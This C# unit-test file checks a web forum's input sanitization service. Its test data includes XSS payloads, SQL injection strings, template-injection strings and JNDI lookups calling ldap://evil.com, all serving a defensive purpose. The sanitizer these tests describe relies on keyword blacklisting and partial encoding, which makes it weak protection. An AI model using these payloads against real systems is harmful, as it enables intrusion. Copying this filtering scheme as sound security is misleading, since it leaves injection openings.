using FluentAssertions;
using WebForum.Api.Services.Implementations;

namespace WebForum.UnitTests.Services;

/// <summary>
/// Unit tests for SanitizationService - Critical security functionality for preventing XSS and injection attacks
/// </summary>
public class SanitizationServiceTests
{
  private readonly SanitizationService _sanitizationService;

  public SanitizationServiceTests()
  {
    _sanitizationService = new SanitizationService();
  }

  #region SanitizeInput Tests

  [Fact]
  public void SanitizeInput_WithNullInput_ShouldReturnNull()
  {
    // Arrange, Act & Assert
    var result = _sanitizationService.SanitizeInput(null!);
    result.Should().BeNull();
  }

  [Fact]
  public void SanitizeInput_WithEmptyInput_ShouldReturnEmpty()
  {
    // Arrange, Act & Assert
    var result = _sanitizationService.SanitizeInput(string.Empty);
    result.Should().BeEmpty();
  }

  [Fact]
  public void SanitizeInput_WithNormalText_ShouldReturnUnchanged()
  {
    // Arrange
    var input = "This is normal text with no dangerous content.";

    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(input);
  }

  [Fact]
  public void SanitizeInput_WithMixedThreats_ShouldSanitizeAll()
  {
    // Arrange
    var input = "<script>alert('xss')</script> DROP TABLE users; {{template}} <?php echo 'test'; ?>";

    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().NotContain("<script");
    result.Should().NotContain("DROP TABLE");
    result.Should().NotContain("{{");
    result.Should().NotContain("<?php");
  }

  #endregion

  #region SanitizeHtml Tests

  [Fact]
  public void SanitizeHtml_WithNullInput_ShouldReturnNull()
  {
    // Arrange, Act & Assert
    var result = _sanitizationService.SanitizeHtml(null!);
    result.Should().BeNull();
  }

  [Fact]
  public void SanitizeHtml_WithEmptyInput_ShouldReturnEmpty()
  {
    // Arrange, Act & Assert
    var result = _sanitizationService.SanitizeHtml(string.Empty);
    result.Should().BeEmpty();
  }

  [Fact]
  public void SanitizeHtml_WithHtmlContent_ShouldEncodeAll()
  {
    // Arrange
    var input = "<div>Hello <b>World</b></div>";

    // Act
    var result = _sanitizationService.SanitizeHtml(input);

    // Assert
    result.Should().Be("&lt;div&gt;Hello &lt;b&gt;World&lt;/b&gt;&lt;/div&gt;");
  }

  [Fact]
  public void SanitizeHtml_WithScriptTag_ShouldEncodeCompletely()
  {
    // Arrange
    var input = "<script>alert('xss')</script>";

    // Act
    var result = _sanitizationService.SanitizeHtml(input);

    // Assert
    result.Should().Be("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;");
  }

  #endregion

  #region SanitizeScripts Tests

  [Theory]
  [InlineData("<script>alert('xss')</script>", "&lt;script>alert('xss')&lt;/script&gt;")]
  [InlineData("<SCRIPT>alert('xss')</SCRIPT>", "&lt;script>alert('xss')&lt;/script&gt;")]
  [InlineData("javascript:alert('xss')", "javascript&#58;alert('xss')")]
  [InlineData("vbscript:msgbox('xss')", "vbscript&#58;msgbox('xss')")]
  [InlineData("data:text/html,<script>alert('xss')</script>", "data&#58;text/html,&lt;script>alert('xss')&lt;/script&gt;")]
  public void SanitizeScripts_WithScriptInjection_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("onload=alert('xss')", "onload&#61;alert('xss')")]
  [InlineData("onclick=alert('xss')", "onclick&#61;alert('xss')")]
  [InlineData("onerror=alert('xss')", "onerror&#61;alert('xss')")]
  [InlineData("onmouseover=alert('xss')", "onmouseover&#61;alert('xss')")]
  [InlineData("ONCLICK=alert('xss')", "onclick&#61;alert('xss')")]
  public void SanitizeScripts_WithEventHandlers_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("<iframe src='evil.com'></iframe>", "&lt;iframe src='evil.com'>&lt;/iframe&gt;")]
  [InlineData("<object data='evil.swf'></object>", "&lt;object data='evil.swf'>&lt;/object&gt;")]
  [InlineData("<embed src='evil.swf'></embed>", "&lt;embed src='evil.swf'>&lt;/embed&gt;")]
  [InlineData("<img src='x' onerror='alert(1)'>", "&lt;img src='x' onerror&#61;'alert(1)'>")]
  [InlineData("<form action='evil.com'></form>", "&lt;form action='evil.com'>&lt;/form&gt;")]
  public void SanitizeScripts_WithDangerousHtmlTags_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  #endregion

  #region SanitizeSql Tests

  [Theory]
  [InlineData("DROP TABLE users", "DROP&#32;TABLE users")]
  [InlineData("DELETE FROM users", "DELETE&#32;FROM users")]
  [InlineData("TRUNCATE TABLE users", "TRUNCATE&#32;TABLE users")]
  [InlineData("INSERT INTO users", "INSERT&#32;INTO users")]
  [InlineData("UPDATE SET password", "UPDATE&#32;SET password")]
  [InlineData("SELECT FROM users", "SELECT&#32;FROM users")]
  [InlineData("UNION SELECT password", "UNION&#32;SELECT password")]
  public void SanitizeSql_WithSqlCommands_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("'; DROP TABLE users; --", "'&#59;&#32;DROP&#32;TABLE users; &#45;&#45;")]
  [InlineData("\"; DROP TABLE users; --", "\"&#59;&#32;DROP&#32;TABLE users; &#45;&#45;")]
  [InlineData("/* comment */", "&#47;&#42; comment &#42;&#47;")]
  public void SanitizeSql_WithSqlInjectionPatterns_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("drop table users", "DROP&#32;TABLE users")]
  [InlineData("Drop Table Users", "DROP&#32;TABLE Users")]
  [InlineData("DeLeTe FrOm users", "DELETE&#32;FROM users")]
  public void SanitizeSql_CaseInsensitive_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  #endregion

  #region Template Injection Tests

  [Theory]
  [InlineData("{{user.name}}", "&#123;&#123;user.name&#125;&#125;")]
  [InlineData("${user.name}", "&#36;&#123;user.name}")]
  [InlineData("#{user.name}", "&#35;&#123;user.name}")]
  public void SanitizeTemplateInjection_WithTemplateExpressions_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("${jndi:ldap://evil.com/exploit}", "&#36;&#123;jndi:ldap://evil.com/exploit}")]
  [InlineData("${ldap://evil.com/exploit}", "&#36;&#123;ldap://evil.com/exploit}")]
  [InlineData("${rmi://evil.com/exploit}", "&#36;&#123;rmi://evil.com/exploit}")]
  [InlineData("${dns://evil.com/exploit}", "&#36;&#123;dns://evil.com/exploit}")]
  public void SanitizeTemplateInjection_WithJndiInjection_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("${JNDI:LDAP://evil.com/exploit}", "&#36;&#123;JNDI:LDAP://evil.com/exploit}")]
  [InlineData("${Ldap://evil.com/exploit}", "&#36;&#123;Ldap://evil.com/exploit}")]
  public void SanitizeTemplateInjection_CaseInsensitive_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  #endregion

  #region PHP Tags Tests

  [Theory]
  [InlineData("<?php echo 'hello'; ?>", "&lt;&#63;php echo 'hello'; &#63;&gt;")]
  [InlineData("<?= $user ?>", "&lt;&#63;&#61; $user &#63;&gt;")]
  [InlineData("<? echo 'hello'; ?>", "&lt;&#63; echo 'hello'; &#63;&gt;")]
  public void SanitizePhpTags_WithPhpCode_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  [Theory]
  [InlineData("<?PHP echo 'hello'; ?>", "&lt;&#63;php echo 'hello'; &#63;&gt;")]
  [InlineData("<?Php Echo 'hello'; ?>", "&lt;&#63;php Echo 'hello'; &#63;&gt;")]
  public void SanitizePhpTags_CaseInsensitive_ShouldSanitize(string input, string expected)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(expected);
  }

  #endregion

  #region Edge Cases and Complex Scenarios

  [Fact]
  public void SanitizeInput_WithNestedThreats_ShouldSanitizeAll()
  {
    // Arrange
    var input = "<script>document.write('{{user.password}}'); DROP TABLE users; <?php echo $_POST['data']; ?></script>";

    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().NotContain("<script");
    result.Should().NotContain("{{");
    result.Should().NotContain("}}");
    result.Should().NotContain("DROP TABLE");
    result.Should().NotContain("<?php");
    result.Should().Contain("&lt;script");
    result.Should().Contain("&#123;&#123;");
    result.Should().Contain("&#125;&#125;");
    result.Should().Contain("DROP&#32;TABLE");
    result.Should().Contain("&lt;&#63;php");
  }

  [Fact]
  public void SanitizeInput_WithRepeatedThreats_ShouldSanitizeAll()
  {
    // Arrange
    var input = "<script><script>alert('xss')</script></script>";

    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().NotContain("<script>");
    result.Should().Contain("&lt;script");
  }

  [Fact]
  public void SanitizeInput_WithUnicodeCharacters_ShouldPreserveValidContent()
  {
    // Arrange
    var input = "Hello 世界! 🌍 This is valid unicode content.";

    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(input); // Should be unchanged
  }

  [Fact]
  public void SanitizeInput_WithLargeInput_ShouldHandleEfficiently()
  {
    // Arrange
    var normalText = "This is a normal sentence. ";
    var largeInput = string.Concat(Enumerable.Repeat(normalText, 1000));

    // Act
    var result = _sanitizationService.SanitizeInput(largeInput);

    // Assert
    result.Should().Be(largeInput); // Should be unchanged
    result.Length.Should().Be(largeInput.Length);
  }

  [Theory]
  [InlineData("   <script>alert('xss')</script>   ")]
  [InlineData("\t\n<script>alert('xss')</script>\r\n")]
  public void SanitizeInput_WithWhitespaceAroundThreats_ShouldSanitizeThreats(string input)
  {
    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().NotContain("<script>");
    result.Should().Contain("&lt;script");
  }

  #endregion

  #region Performance Tests

  [Fact]
  public void SanitizeInput_WithMultipleCallsSameInput_ShouldReturnConsistentResults()
  {
    // Arrange
    var input = "<script>alert('xss')</script> DROP TABLE users;";

    // Act
    var result1 = _sanitizationService.SanitizeInput(input);
    var result2 = _sanitizationService.SanitizeInput(input);
    var result3 = _sanitizationService.SanitizeInput(input);

    // Assert
    result1.Should().Be(result2);
    result2.Should().Be(result3);
  }

  [Fact]
  public void SanitizeInput_WithAlreadySanitizedInput_ShouldNotDoubleSanitize()
  {
    // Arrange
    var input = "&lt;script&gt;alert('xss')&lt;/script&gt;";

    // Act
    var result = _sanitizationService.SanitizeInput(input);

    // Assert
    result.Should().Be(input); // Should remain the same, not double-encoded
  }

  #endregion
}
